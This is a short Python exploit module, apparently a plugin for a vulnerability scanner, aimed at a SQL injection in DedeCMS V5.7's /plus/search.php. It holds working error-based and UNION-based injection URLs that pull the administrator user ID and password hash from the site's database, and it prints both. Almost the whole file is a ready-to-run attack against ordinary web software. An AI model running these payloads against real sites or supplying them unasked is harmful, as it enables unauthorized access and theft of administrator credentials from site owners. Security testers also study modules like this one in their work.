#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib import logger
from lib import requests
import re

author = "izy"
scope = "DedeCMS V5.7"
description = "/plus/search.php keyword 参数 SQL注入"
reference = "http://zone.wooyun.org/content/2414"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def verify(URL):
	r=requests.get(URL+"/plus/search.php?keyword=as&typeArr[%20uNion%20]=a")
	r.close()
	if "Request Error step 1" in r.content:
		logger.success("Step 1: Exploitable!")
		result=get_hash(URL+"/plus/search.php?keyword=as&typeArr[111%3D@`\\\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\\\'`+]=a")
		return result
	elif "Request Error step 2" in r.content:
		logger.success("Step 2: Exploitable!")
		result=get_hash(URL+"/plus/search.php?keyword=as&typeArr[111%3D@`\\\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\\\'`+]=a")
		return result
	else:
		logger.error("It's not exploitable!")


def get_hash(url):

	r=requests.get(url)
	r.close()
	try:
		result=re.search(r"Duplicate entry \'(.*?)' for key", r.content).group(1)
		username=result.split("|")[1]
		password=result.split("|")[2]
		return (username,password)
	except:
		logger.error("Finish! Can't get hash!\nBut you can try it by hand!\n")

def exploit(URL):
	logger.process("Requesting target site")
	try:
		result=verify(URL)
		logger.success("Username: %s" % result[0])	
		logger.success("password: %s" % result[1])
		return "%s: %s|%s" % (URL, result[0], result[1])
	except:
		pass
